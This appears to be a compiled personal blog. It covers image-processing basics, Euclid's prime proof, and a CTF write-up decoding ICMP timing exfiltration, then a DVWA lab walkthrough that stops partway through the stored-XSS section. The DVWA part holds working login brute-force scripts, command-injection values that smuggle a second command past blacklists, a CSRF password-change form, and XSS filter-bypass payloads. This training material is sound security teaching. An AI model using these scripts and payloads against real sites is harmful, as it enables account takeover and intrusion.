+<p><img src="https://cdn-images-1.medium.com/max/2560/1*AT7SPmKOA-mIn9ffnU9Eqg.jpeg" alt="Credit" /><em><a href="https://www.geeksforgeeks.org/matlab-rgb-image-representation/">Credit</a></em></p>
+<p>So, the intensity of the pixel in each channel will ultimately decide the color of the pixel, by combining the different levels of Red, Green and Blue. For more intuition on this topic read <a href="https://saaisudarsanan.medium.com/computer-vision-python-1-3a8af9b3616">this</a>.</p>
+<p>An RGB image of dimensions 800x400 with a bit depth of 8, will have a total of <strong>800 x 400 x 3 = 960,000 pixels</strong> and if each pixel has 8 bits, we will have a image of size **7,680,000 bits = 960,000 bytes = 960 Kilobytes, which is too much for this image. **This is however the raw size of the image, it is uncompressed, we can compress the image using various, compression algorithms like PNG and JPG, to reduce the size.</p>
+<p>PNG images are reduced without any loss and are hence of better quality but larger in size, but this is not the case for JPG images, which have some loss and help in reducing the size by a greater deal instead.</p>
+<p><strong>What is an RGB Signal?</strong></p>
+<p>With what you have read, you should now be able to understand, how a video plays… simple,</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*dgZDOO-Q7X-miLFg7jcVnA.png" alt="This is the values for One Pixel" /><em>This is the values for One Pixel</em></p>
+<p>The above image shows how an RGB signal looks like, continuously changing the values of the 3 channels of the pixels.</p>
+<h3 id="noise-as-functions"><a class="header" href="#noise-as-functions"><strong>Noise as Functions:</strong></a></h3>
+<p>As I previously mentioned, images are nothing but 2d functions, and like all functions we can transform them and perform operations of them to get different other results.</p>
+<p>A Color Image has 3 such functions stacked as a vector, each pixel will have 3 values. One each for R,G and B.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*m-xmbyuQ62xTKyZ2HZwQzA.png" alt="f(x,y) is a vector valued function" /><em>f(x,y) is a vector valued function</em></p>
+<p>Images are often not pure, they are susceptible to noise.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*_fIGPtMUXh-ZE8dCe_Lh2Q.png" alt="I’(x,y) is the impure image" /><em>I’(x,y) is the impure image</em></p>
+<p><strong>N(x,y) is the noise function</strong>. Noise Functions can be mostly classified into 3 categories,</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*ZAYeiPgim8Mn0WbU42LxQA.png" alt="Left(Pure) — Right(Salt and Pepper Noise)" /><em>Left(Pure) — Right(Salt and Pepper Noise)</em></p>
+<p>**Salt and Pepper Noises **can easily be identified as random black and white spots appearing on the image.</p>
+<h3 id="types-of-image-processing"><a class="header" href="#types-of-image-processing"><strong>Types of Image Processing:</strong></a></h3>
+<p>Image processing can be classified into 3 types based on the output of the process.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*P-lnANLhsNwBODwgdsdX4w.png" alt="" /></p>
+<p>Low Level Processes include, Image Acquisition, Image Enhancement, Image Restoration, Color Image Processing, etc.</p>
+<p>Mid Level Processes include, Representation and Description, Segmentation, Object Recognition, etc.</p>
+<p>High Level Processes include, tasks where the agent has to respond to a scene or a image based on previously understood relations, it is a growing field and is usually associated with Artificial Intelligence. This field is however highly constrained by limited amount of computation power.</p>
+<p>Image Processing algorithms often involve a heavy amount of Matrix Multiplications, and require a GPU for running, this is where it gets expensive.</p>
+<p>Some algorithms, related to Convolutional Neural Networks may take days or sometimes weeks to complete, and this leaves the programmers with very low margins of error.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="why-image-processing"><a class="header" href="#why-image-processing">Why Image Processing?</a></h1>
+<h1 id="date-2021-07-12"><a class="header" href="#date-2021-07-12"><small style="font-weight:normal; font-size:0.7em;">Date: 2021-07-12</small></a></h1>
+<hr />
+<p>What in the world is it?</p>
+<p>An image may be defined as a two-dimensional function f(x,y), where x and y are spatial blah blah blah…</p>
+<p>Let’s not worry ourselves with the definition for now, but before that I believe nothing in this world should be given to someone, if they don’t know the essence of it. You first need to know the actual grace and history of this field, before you get into the nitty witty details. I am following a textbook alright.</p>
+<p><strong>Digital image processing by Rafael C. Gonzalez, Richard E. Woods</strong> to be precise. I am gonna be using it to make sure, I cover all the topics. The code however and many other examples may or may not be found in there.</p>
+<p>The very first use of this system came about in the 1920’s in the Bartlane Cable picture transmission system. It used submarine cables to carry digitised newspaper images across the Atlantic, drastically reducing the time for moving images from New York to London, from weeks to hours. It served as a major nerve during that period. It perceived the image with 5 grey levels, they later increased to 15 grey levels.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*2xM8EoqevHz-Psun8sAoig.jpeg" alt="A photo transmitted with the help of Bartlane System" /><em>A photo transmitted with the help of Bartlane System</em></p>
+<p>It is all fun and games until the wars begin, right… the wars started, and eventually came to an end, and soon enough we were in the space era, mankind wanted to put as many satellites in space as possible. USSR and USA even had a space race going on. But, what is the use of satellites in the orbit, if the images they give you made absolutely no sense.</p>
+<p>We can’t blame them, coz, a few clouds are enough to cause signal distortion, to make salt and pepper out of the images. Images had to be enhanced and for this we used DIP.</p>
+<p>CAT &amp; CT scans heavily rely of X-ray Imaging technology. They have been game-changers in the field of medicine and have been used to saves hundreds of lives. The inventor, Godfrey Hounsfield even received a Nobel Prize in Medicine for the invention.</p>
+<p>Mankind had to wait till the 1960’s to put DIP in the common man’s hands. Computers were finally powerful but yet, cheap enough to allow common people to buy and use them.</p>
+<p>Imaging in general can have various sources, like EM Waves, Ultrasonic, Electronic,etc. We’ll quickly look into all of em’.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*QZrZckgGk7v3gOo4Xtiuqw.jpeg" alt="" /></p>
+<p>An EM wave in the EM Spectrum, short for Electro-magnetic wave, consists of photons, which are bundles of energy.</p>
+<h3 id="gamma-ray-imaging"><a class="header" href="#gamma-ray-imaging">Gamma Ray Imaging:</a></h3>
+<p>Gamma Rays have a super small wavelength, if you remember wavelength is inversely proportional to frequency and directly proportional to energy of the photon in the wave.</p>
+<p>I do not suggest that you walk into a room filled with gamma-rays, since it is highly unlikely that you’ll walk out.</p>
+<p>They are used in the field of nuclear medicine. The equipment is easily portable and is comparatively cheap, moreover the higher penetrating power of gamma-rays is useful, but the images produced are of poor quality and not sharp.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*_tk-88J3n1RaHezM01NXhQ.gif" alt="Images produced via Gamma Ray Imaging" /><em>Images produced via Gamma Ray Imaging</em></p>
+<h3 id="x-ray-imaging"><a class="header" href="#x-ray-imaging">X-Ray Imaging:</a></h3>
+<p>X-rays are super cool, and I’m pretty sure you know how they are used for imaging, but, apart from the wide range of medical uses, like Mammography, Diagnostics and other treatments, they are used in airport scanners to check for dangerous items.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*JKkddWR9MKxv9JHqZ9iHcg.jpeg" alt="Some random dude’s suitcase" /><em>Some random dude’s suitcase</em></p>
+<h3 id="uv-imaging"><a class="header" href="#uv-imaging">UV Imaging:</a></h3>
+<p>Photographs with a UV source has various uses, one important use is in criminal forensics, photographs taken with UV Source can reveal hidden bruises and scars, sometimes even long after visible healing has completed.</p>
+<h3 id="infrared-imaging"><a class="header" href="#infrared-imaging">Infrared Imaging:</a></h3>
+<p>Infrared (IR) imaging technology is used to measure the temperature of an object. All objects emit electromagnetic radiation, primarily in the <strong>IR</strong> wavelength, which cannot be seen by the naked eye. However, <strong>IR</strong> radiation can be felt as heat on one’s skin. The hotter the object, the more <strong>IR</strong> radiation it emits.</p>
+<p>These thermal cameras are of great use and can save lives in events of natural disasters, where soldiers search for people who are alive by using these cameras. There are so many uses, like Conditional Monitoring, Night Vision, etc.</p>
+<h3 id="microwave-imaging"><a class="header" href="#microwave-imaging">Microwave Imaging:</a></h3>
+<p>Microwaves are amazing, they do really help in heating up your popcorn, but, let’s discuss images here,</p>
+<p>On of the most profound uses of Microwaves in Imaging is for RADAR(Radio Detection and Ranging). Apart from being a concept that I hated during my physics lessons in school, it turned out to be one of the coolest concepts when I did some research for this story.</p>
+<p>Microwaves have a large wavelength, hence have a lower energy and don’t scatter easily when they come into contact with dense fog or other distortion media.</p>
+<p>They can withstand clouds, but can’t stand a chance against a single water droplet, and don’t get absorbed easily due to their low wavelength.</p>
+<p>Microwave Radar is widely used for meteorologic mapping and weather forecasting. They are of great use in mapping terrains, detecting air-planes, ships and speeding motorists.</p>
+<p><strong>Radio Waves</strong> are used in MRI scans and are applicable in RADAR as well.</p>
+<p><strong>Ultrasonic Imaging:</strong></p>
+<p>This involves the use of sound, sound is bounced of the surface of an object and the attributes of the returning sound waves are used to create a map of the structure it bounced off of. It is used in searching for Oil and Gas fields under the ocean.</p>
+<p>It is comparable to how, blind people train themselves in echolocation to get a mental picture of their surroundings.</p>
+<p>Okay, so why do we need Image Processing? I gave a lots of cool looking examples alright, but, why do you need it?</p>
+<p>One can use Image Processing for various purposes,</p>
+<p>Converting a Image into its Digital form, in order to perform operations like enhancement, restoration, recognition, segmentation, feature extraction on it.</p>
+<p>A person can also use DIP to extract a particular attribute from an image which maybe of use to him/her.</p>
+<p>Apart from the above example, you might have noticed that I haven’t covered the field of visible light imaging. I haven’t done so, because the applications are too versatile for me to cover in one post, let aside one subheading. So, do give the 1st chapter of the mentioned book a read.</p>
+<p>Now that I have discussed fairly well, the origins and the fields of uses of Digital Image Processing. It is finally time to tell you what a digital image is…</p>
+<p>An Image maybe defined as a 2D function f(x,y), where x and y are spatial coordinates and the amplitude of f at any pair of coordinates is the intensity or the grey level at that point.</p>
+<iframe src="https://medium.com/media/03a8d7e3927c9f54a5c6ba60b1aab322" frameborder=0></iframe>
+<p>If x, y and f(x,y) are all finite quantities, then it is called a digital image.</p>
+<p>Thank you, hoping to see you on my next post…</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="the-notorious-prime-numbers"><a class="header" href="#the-notorious-prime-numbers">The Notorious Prime Numbers</a></h1>
+<h1 id="date-2021-05-11"><a class="header" href="#date-2021-05-11"><small style="font-weight:normal; font-size:0.7em;">Date: 2021-05-11</small></a></h1>
+<hr />
+<p>Haunting Mathematicians since forever!</p>
+<p>I have heard of advanced mathematical concepts like Analytical Continuation, Statistical Inference and so on… but do you know that the mysteries of one of the oldest concepts of mathematics… The Prime Numbers, are yet to be discovered!!</p>
+<p>To discover more about prime numbers, let us go back to 323 BC, and when its this old, we know its Euclid of Alexandria, the father of geometry himself!!</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*VKmskCIPkmhtTf_FJllVHw.jpeg" alt="{{PD-USGov}}" /><em><a href="https://commons.wikimedia.org/wiki/Template:PD-USGov">{{PD-USGov}}</a></em></p>
+<p>Mr.Euclid apparently wrote a mathematical treatise of 13 books which have never been out of print since the printing press was invented. The mathematical and logical rigour of this book is so high, that it wasn’t matched till the 19th century.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*PM78sMeXSlWmnXHjhn2J-g.jpeg" alt="Title page of Sir Henry Billingsley first English version of Euclid’s Elements, 1570" /><em>Title page of Sir Henry Billingsley first English version of Euclid’s Elements, 1570</em></p>
+<p>Second only to the Bible in the number of copies printed, this book contains proofs to the most profound problems in number theory and geometry.</p>
+<p>One such proof suggests that there are infinitely many prime numbers.</p>
+<p>How? I’ll try to phrase it,</p>
+<p>To prove that there are infinitely many prime numbers, assume that there are only a finite number of prime numbers and that they are on the following set.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*ONen1-I-fnwCZW7Oza4QNg.png" alt="" /></p>
+<blockquote>
+<h1 id="if-q-is-prime-then-there-exists-at-least-one-more-prime-that-is-not-on-the-list-and-hence-there-is-a-contradiction-and-therefore-there-are-an-infinite-number-of-prime-numbers"><a class="header" href="#if-q-is-prime-then-there-exists-at-least-one-more-prime-that-is-not-on-the-list-and-hence-there-is-a-contradiction-and-therefore-there-are-an-infinite-number-of-prime-numbers">If Q is prime, then there exists at least one more prime that is not on the list, and hence there is a contradiction and therefore there are an infinite number of prime numbers.</a></h1>
+<h1 id="if-q-is-non-prime-then-there-must-exist-a-prime-number-p-on-the-list-of-prime-numbers-we-initially-considered-such-that-p-divides-q"><a class="header" href="#if-q-is-non-prime-then-there-must-exist-a-prime-number-p-on-the-list-of-prime-numbers-we-initially-considered-such-that-p-divides-q">If Q is non-prime, then there must exist a prime number “p” on the list of prime numbers we initially considered, such that p divides Q.</a></h1>
+<h1 id="we-now-know-that"><a class="header" href="#we-now-know-that">We now know that,</a></h1>
+<h1 id="p-divides-q-and-p-also-divides-m-since-m-is-the-product-of-all-prime-numbers"><a class="header" href="#p-divides-q-and-p-also-divides-m-since-m-is-the-product-of-all-prime-numbers"><strong>p divides Q</strong> and <strong>p also divides M</strong> (since M is the product of all prime numbers)</a></h1>
+<h1 id="since-q--m1"><a class="header" href="#since-q--m1">since, Q = M+1,</a></h1>
+<h1 id="p-must-also-divide-the-difference-of-q-and-m-ie-1"><a class="header" href="#p-must-also-divide-the-difference-of-q-and-m-ie-1"><strong>p must also divide the difference of Q and M, i.e, 1.</strong></a></h1>
+<h1 id="since-there-is-no-prime-number-that-can-divide-1-p-does-not-exist-in-the-list-and-is-a-prime-which-means-there-is-at-least-one-more-prime-that-is-not-on-the-list-we-considered"><a class="header" href="#since-there-is-no-prime-number-that-can-divide-1-p-does-not-exist-in-the-list-and-is-a-prime-which-means-there-is-at-least-one-more-prime-that-is-not-on-the-list-we-considered">Since there is no prime number that can divide 1, p does not exist in the list and is a prime. Which means there is at least one more prime that is not on the list we considered.</a></h1>
+</blockquote>
+<p>Example 1,</p>
+<blockquote>
+<h1 id="consider-that-there-are-only-4-primes"><a class="header" href="#consider-that-there-are-only-4-primes">Consider that there are only 4 primes,</a></h1>
+<h1 id="2357"><a class="header" href="#2357">2,3,5,7</a></h1>
+<h1 id="m--2357--210"><a class="header" href="#m--2357--210">M = 2<em>3</em>5*7 = 210</a></h1>
+<h1 id="q--211"><a class="header" href="#q--211">Q = 211</a></h1>
+<h1 id="but-211-is-a-prime-number"><a class="header" href="#but-211-is-a-prime-number">But, 211 is a prime number.</a></h1>
+</blockquote>
+<p>Example 2,</p>
+<blockquote>
+<h1 id="consider-that-our-list-of-primes-is"><a class="header" href="#consider-that-our-list-of-primes-is">Consider that our list of primes is,</a></h1>
+<h1 id="23571113"><a class="header" href="#23571113">2,3,5,7,11,13</a></h1>
+<h1 id="m--23571113--30030"><a class="header" href="#m--23571113--30030">M = 2<em>3</em>5<em>7</em>11*13 = 30030</a></h1>
+<h1 id="q--30031--59509"><a class="header" href="#q--30031--59509">Q = 30031 = 59*509</a></h1>
+<h1 id="but-59-is-a-prime-that-is-not-on-the-list-of-all-primes-that-we-considered"><a class="header" href="#but-59-is-a-prime-that-is-not-on-the-list-of-all-primes-that-we-considered">but, 59 is a prime that is not on the list of all primes that we considered!</a></h1>
+</blockquote>
+<p>Hence the proof!</p>
+<p>To put it simply, the appearance of these prime numbers, on the number line, the pin point distribution of these prime numbers is yet to be found, the largest prime number we know for now is 2⁸²⁵⁸⁹⁹³³ -1, but there is no way as of now to predict a prime number. We do have very strong theorems, which are waiting to be proven.</p>
+<p><em>And hence the stage is set for a long and confusing history of prime numbers, little is known about this wonderful series of excellence, which has been far from the reach of humanity’s grand mathematicians. After Euclid, many tried to tame the primes. Not one could succeed, but every single time we struck hard enough, we got close… now, all that we require is a proof, for the Riemann Hypothesis.</em></p>
+<h3 id="what-is-the-riemann-hypothesis"><a class="header" href="#what-is-the-riemann-hypothesis">What is the Riemann Hypothesis?</a></h3>
+<p>So, basically Riemann Hypothesis, is a millennial problem, one of many proposed by the <a href="https://en.wikipedia.org/wiki/Clay_Mathematics_Institute">Clay Mathematics Institute</a> on May 24, 2000. Its been almost 21 years and as of now, only 1 problem has been solved. Solving these problems earns you a million dollars, but that is trivial as opposed to a seat in the Hall of Fame of Mathematics.</p>
+<blockquote>
+<p><a href="https://en.wikipedia.org/wiki/Millennium_Prize_Problems#Poincar%C3%A9_conjecture">*Poincare conjecture</a>*
+<a href="https://en.wikipedia.org/wiki/Millennium_Prize_Problems#P_versus_NP">*P versus NP</a>*
+<a href="https://en.wikipedia.org/wiki/Millennium_Prize_Problems#Hodge_conjecture">*Hodge conjecture</a>*
+<a href="https://en.wikipedia.org/wiki/Millennium_Prize_Problems#Riemann_hypothesis">*Riemann hypothesis</a>*
+<a href="https://en.wikipedia.org/wiki/Millennium_Prize_Problems#Yang%E2%80%93Mills_existence_and_mass_gap">*Yang–Mills existence and mass gap</a>*
+<a href="https://en.wikipedia.org/wiki/Millennium_Prize_Problems#Navier%E2%80%93Stokes_existence_and_smoothness">*Navier–Stokes existence and smoothness</a>*
+<a href="https://en.wikipedia.org/wiki/Millennium_Prize_Problems#Birch_and_Swinnerton-Dyer_conjecture">*Birch and Swinnerton-Dyer conjecture</a>*</p>
+</blockquote>
+<p>Only one has been solved as of now, that is the <em>Poincare conjecture.</em></p>
+<p>An Interesting Story about the <em>Poincare conjecture :</em></p>
+<p>After a century’s effort by mathematicians around the world, a random mathematician, who the world didn’t know much posted a paper on arXiv and the paper was floating around the internet for a while until one morning…</p>
+<p>After a team of mathematicians found the paper on the internet, they were shell-shocked. He used “Ricci Flow”, which was a program derived from a failed attempt of Richard S Hamilton in cracking the <em>Poincare conjecture.</em></p>
+<p>The man’s name was later revealed to be <strong>Grigori Yakovlevich Perelman.</strong> He was offered the 1 million dollars by the Clay Institute, which he…DECLINED!! , since he thought Richard S Hamilton was equally creditable for the proof.</p>
+<p>He was also offered the Fields Medal, for his contributions to geometry and his revolutionary insights into the analytical and geometric structure of the <a href="https://en.wikipedia.org/wiki/Ricci_flow">Ricci flow</a>, which he again declined.</p>
+<blockquote>
+<h1 id="im-not-interested-in-money-or-fame-i-dont-want-to-be-on-display-like-an-animal-in-a-zoo"><a class="header" href="#im-not-interested-in-money-or-fame-i-dont-want-to-be-on-display-like-an-animal-in-a-zoo">“I’m not interested in money or fame; I don’t want to be on display like an animal in a zoo.”</a></h1>
+</blockquote>
+<p>Several teams of mathematicians came together and checked if he was right about the proof, which he was.</p>
+<p>Such is the greatness of one of the greatest problems to be solved. Now you know what you are dealing with.</p>
+<p>I won’t add his photo since he told me he doesn’t like fame…</p>
+<blockquote>
+<p><a href="https://en.wikipedia.org/wiki/Grigori_Perelman">**CLICK HERE TO GO TO HIS WIKI PAGE.</a>**</p>
+</blockquote>
+<p>Riemann Hypothesis and how it came about has a long history, enough for me to write a separate story about it.</p>
+<center><iframe width="560" height="315" src="https://www.youtube.com/embed/zlm1aajH6gY" frameborder="0" allowfullscreen></iframe></center><div style="break-before: page; page-break-before: always;"></div><h1 id="data-exfiltration-challengectf-internacional-metared-2021-3rd-stage"><a class="header" href="#data-exfiltration-challengectf-internacional-metared-2021-3rd-stage">Data Exfiltration Challenge—CTF Internacional MetaRed 2021-3rd STAGE</a></h1>
+<h1 id="date-2021-11-06"><a class="header" href="#date-2021-11-06"><small style="font-weight:normal; font-size:0.7em;">Date: 2021-11-06</small></a></h1>
+<hr />
+<p>Last night mr. heker broke into our systems and stole our flag. All our communications are secure and we can’t tell how the data leave our network.</p>
+<blockquote>
+<p>I will send you an abnormal trace of communication. Please analize it and let me know if you figure it out. We need to get back that flag.
+By the way. You know how mr. heker loves to play with people’s mind. He delivered a video with a creepy toy repeating the words “tic toc, tic toc”. I am not sure if it is a clue or just a silly game of him.
+Creator : Nandx</p>
+</blockquote>
+<p>Points to note :</p>
+<ul>
+<li>The PCAP File contains 418 ICMP Packets.</li>
+<li>ICMP : Internet Control Message Protocol</li>
+<li>The Hint the attacker left behind is a creepy toy that kept repeating **tic toc,tic toc **</li>
+</ul>
+<p><strong>The tic-toc part diverts the focus to the time of request.</strong></p>
+<p>Why Request? : Data is being exfiltrated here using the ICMP Protocol, so the replies can be disregarded.</p>
+<ol>
+<li>The attacker can control the time difference between the one packet and another.
+Therefore,</li>
+</ol>
+<p><em>View → Time display format → Seconds since previous captured packet and also change the format to only seconds.</em></p>
+<ol start="2">
+<li>To see only the requests, apply the display filter</li>
+</ol>
+<p><em>icmp.type == 8</em></p>
+<p>Your display should look like this,</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*3JV7JLkI8L3qh5inBhYl0Q.png" alt="" /></p>
+<ol start="3">
+<li>
+<p>Export the packet dissections.
+<em>File → Export Packet Dissections → As CSV</em></p>
+</li>
+<li>
+<p>I have used pandas to extract only the time field data, you may use a tool of your choice or just continue with the pandas method.</p>
+</li>
+</ol>
+<iframe src="https://medium.com/media/e77ca0019d75bd58b647d6740066616b" frameborder=0></iframe>
+<p>On running the python file you should get a string of bits.</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*ukDVnMOeO0NuHJ8asR4WxA.png" alt="" /></p>
+<p>Convert it to ASCII to find the flag.</p>
+<p><img src="https://cdn-images-1.medium.com/max/3060/1*3zJPxyJkLLX-8nCYMM9itQ.png" alt="Believe me, you will get the flag." /><em>Believe me, you will get the flag.</em></p>
+<p><strong>Why disregard the leading 0, (Notice that I have popped the first element from the pktimes list, in the python program. If I did not, I would have had a 0 there)</strong></p>
+<p>When I took the output without removing the leading 0, I got,</p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*SsaqjVjYqehlM2gIHtAU3w.png" alt="" /></p>
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*7xkDYS9Dg85YaHv-zpAMlQ.png" alt="" /></p>
+<p>There was one extra <strong>1</strong> in the end. So, I decided to remove the first <strong>0</strong>, since that is the time related to the first packet in the capture and the attacker would not have been able to manipulate it (It will remain 0.00000).</p>
+<p>Happy Hunting…</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="solutions-for-dvwa"><a class="header" href="#solutions-for-dvwa">Solutions for DVWA</a></h1>
+<h1 id="date-2023-03-04-1"><a class="header" href="#date-2023-03-04-1"><small style="font-weight:normal; font-size:0.7em;">Date: 2023-03-04</small></a></h1>
+<hr />
+<h1 id="brute-force"><a class="header" href="#brute-force">Brute Force</a></h1>
+<h2 id="low-and-medium"><a class="header" href="#low-and-medium">Low and Medium</a></h2>
+<p>In the <code>Brute Force Low</code> level we find that the password is being shared in the URL of the website, like,</p>
+<p>http://127.0.0.1/dvwa/vulnerabilities/brute/?username=admin&amp;password=123456&amp;Login=Login#</p>
+<p>We can brute force the different URLs using this code and the rockyou.txt wordlist.</p>
+<p>If the password is wrong, I will get,
+<code>Username and/or password incorrect.</code>
+on the screen.</p>
+<pre><code class="language-py">import requests
+def get_url(username,password):
+    return f"http://127.0.0.1/dvwa/vulnerabilities/brute/?username={username}&amp;password={password}&amp;Login=Login#"
+
+username = input("Enter Username : ")
+
+COOKIES = {
+    "PHPSESSID":"pf9kipp16vs54366mr21smurse",
+    "security":"high"
+}
+with open("rockyou.txt") as f:
+    while True:
+        p = f.readline().strip()
+        url = get_url(username,p)
+        r = requests.get(url,cookies=COOKIES)
+        print("Checking ", p)
+        if 'incorrect' not in r.text:
+            print(f"Found password for {username} = {p}")
+            break
+</code></pre>
+<h2 id="high"><a class="header" href="#high">High</a></h2>
+<p>Use the following code for High level</p>
+<pre><code class="language-py">import requests
+def get_url(username,password,token):
+    return f"http://127.0.0.1/dvwa/vulnerabilities/brute/?username={username}&amp;password={password}&amp;user_token={token}&amp;Login=submit#"
+username = input("Enter Username : ")
+COOKIES = {
+    "PHPSESSID":"km7qua1eth40r643ggc8ll6cbp",
+    "security":"high"
+}
+passwords = open("rockyou.txt","r")
+while True:
+    session = requests.Session()
+    r = session.get("http://127.0.0.1/dvwa/vulnerabilities/brute/index.php",cookies=COOKIES)
+    body = r.text.split(" ")
+    token = body[body.index("name='user_token'")+1].split("=")[1][1:-1]
+
+    p = passwords.readline().strip()
+    url = get_url(username,p,token)
+    r = session.get(url,cookies=COOKIES)
+    if 'incorrect' in r.text:
+        print("Trying ",p)
+    else:
+        print("Found ",p)
+        break
+</code></pre>
+<h1 id="command-injection"><a class="header" href="#command-injection">Command Injection</a></h1>
+<p>Trying to inject a windows command - <code>dir</code></p>
+<h2 id="low"><a class="header" href="#low">Low</a></h2>
+<pre><code class="language-php">$target = $_REQUEST[ 'ip' ];
+
+    // Determine OS and execute the ping command.
+    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+        // Windows
+        $cmd = shell_exec( 'ping  ' . $target );
+    }
+</code></pre>
+<p>It is directly executing the <code>$target</code> without any input validation.
+<strong>Attack :</strong> 127.0.0.1 &amp;&amp; dir</p>
+<h2 id="medium"><a class="header" href="#medium">Medium</a></h2>
+<p>Some level of input validation is performed this time,</p>
+<pre><code class="language-php">// Set blacklist
+    $substitutions = array(
+        '&amp;&amp;' =&gt; '',
+        ';'  =&gt; '',
+    );
+
+    // Remove any of the charactars in the array (blacklist).
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+</code></pre>
+<p>But, notice that only <code>&amp;&amp;</code> is being replaced, we can use <code>&amp;</code>.
+<strong>Attack :</strong> 127.0.0.1 &amp; dir</p>
+<h2 id="high-1"><a class="header" href="#high-1">High</a></h2>
+<p>More Filtering has been done,</p>
+<pre><code class="language-php">if( isset( $_POST[ 'Submit' ]  ) ) {
+    // Get input
+    $target = trim($_REQUEST[ 'ip' ]);
+
+    // Set blacklist
+    $substitutions = array(
+        '&amp;'  =&gt; '',
+        ';'  =&gt; '',
+        '| ' =&gt; '',
+        '-'  =&gt; '',
+        '$'  =&gt; '',
+        '('  =&gt; '',
+        ')'  =&gt; '',
+        '`'  =&gt; '',
+        '||' =&gt; '',
+    );
+
+    // Remove any of the characters in the array (blacklist).
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+</code></pre>
+<p>The substitutions only match <code>| </code> and not <code>|</code>. Hence, there is a loophole in the validation.
+The pipe symbol (|) is used for output redirection, and that is why you want see the output for the ping command.
+<strong>Attack :</strong> 127.0.0.1|dir (No Spaces)</p>
+<h1 id="csrf"><a class="header" href="#csrf">CSRF</a></h1>
+<h2 id="low-1"><a class="header" href="#low-1">Low</a></h2>
+<pre><code class="language-html">&lt;form action="http://127.0.0.1/dvwa/vulnerabilities/csrf/?" method="GET"&gt;
+ &lt;h1&gt;Click Me&lt;/h1&gt;
+ &lt;input type="hidden" AUTOCOMPLETE="off" name="password_new" value="hacked"&gt;
+ &lt;input type="hidden" AUTOCOMPLETE="off" name="password_conf" value="hacked"&gt;
+ &lt;input type="submit" value="Change" name="Change"&gt;
+&lt;/form&gt;
+</code></pre>
+<p>The above website is a phishing website created by the attacker, it sends a request to the link,
+"http://127.0.0.1/dvwa/vulnerabilities/csrf/?" with the new password in the parameters of the link. It is hence used to attack the CSRF vulnerability, since, the website doesn't check for the source of the request.</p>
+<hr />
+<h1 id="xss-dom"><a class="header" href="#xss-dom">XSS DOM</a></h1>
+<h2 id="low-2"><a class="header" href="#low-2">Low</a></h2>
+<p><strong>Attack :</strong>  <code>&lt;script&gt;alert("hacked")&lt;/script&gt;</code></p>
+<h2 id="medium-1"><a class="header" href="#medium-1">Medium</a></h2>
+<pre><code class="language-html">&lt;select name="default"&gt;
+				&lt;script&gt;
+					if (document.location.href.indexOf("default=") &gt;= 0) {
+						var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
+						document.write("&lt;option value='" + lang + "'&gt;" + decodeURI(lang) + "&lt;/option&gt;");
+						document.write("&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;");
+					}
+					    
+					document.write("&lt;option value='English'&gt;English&lt;/option&gt;");
+					document.write("&lt;option value='French'&gt;French&lt;/option&gt;");
+					document.write("&lt;option value='Spanish'&gt;Spanish&lt;/option&gt;");
+					document.write("&lt;option value='German'&gt;German&lt;/option&gt;");
+				&lt;/script&gt;
+			&lt;/select&gt;
+</code></pre>
+<p>We have to break out of the <code>&lt;select&gt;</code> tag, and for that we have to, use the following command.
+Our input is <code>lang</code>	, from there,
+<strong>Attack :</strong><code>&gt;&lt;/option&gt;&lt;/script&gt;&lt;/select&gt;&lt;img src=x onerror=alert("hacked")&gt;</code></p>
+<h2 id="high-2"><a class="header" href="#high-2">High</a></h2>
+<p>The programmer has set it in such a way that, any other input we give other than the four languages will be defaulted to English.</p>
+<pre><code class="language-php">// Is there any input?
+if ( array_key_exists( "default", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) {
+
+    # White list the allowable languages
+    switch ($_GET['default']) {
+        case "French":
+        case "English":
+        case "German":
+        case "Spanish":
+            # ok
+            break;
+        default:
+            header ("location: ?default=English");
+            exit;
+    }
+}
+?&gt;	
+</code></pre>
+<p>We should avoid sending the payload to the server, for blacklisting, so, we use the <code>#</code>
+<strong>Attack :</strong> English#<script>alert("hacked")</script></p>
+<h1 id="xss-reflected"><a class="header" href="#xss-reflected">XSS REFLECTED</a></h1>
+<h2 id="low-3"><a class="header" href="#low-3">Low</a></h2>
+<p><strong>Attack :</strong>  <code>&lt;script&gt;alert("hacked")&lt;/script&gt;</code></p>
+<h2 id="medium-2"><a class="header" href="#medium-2">Medium</a></h2>
+<p>Some level of filtering has been done this time,</p>
+<pre><code class="language-php">$name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] );
+</code></pre>
+<p>They have only replaced lowercase <code>&lt;script&gt;</code>, which means, <code>&lt;SCRIPT&gt;</code> will work!
+<strong>Attack :</strong>  <code>&lt;SCRIPT&gt;alert("hacked")&lt;/SCRIPT&gt;</code></p>
+<h2 id="high-3"><a class="header" href="#high-3">High</a></h2>
+<p>Only script tags are being targetted by this programmer, use an img tag instead.
+<strong>Attack :</strong> <code>&lt;img src=x onerror=alert("hacked")&gt;</code></p>
+<h1 id="xss-storage"><a class="header" href="#xss-storage">XSS STORAGE</a></h1>
+<h2 id="low-4"><a class="header" href="#low-4">Low</a></h2>
+<p><strong>Attack :</strong>  <code>&lt;script&gt;alert("hacked")&lt;/sript&gt;</code> (in Message)</p>
+<h2 id="medium-3"><a class="header" href="#medium-3">Medium</a></h2>
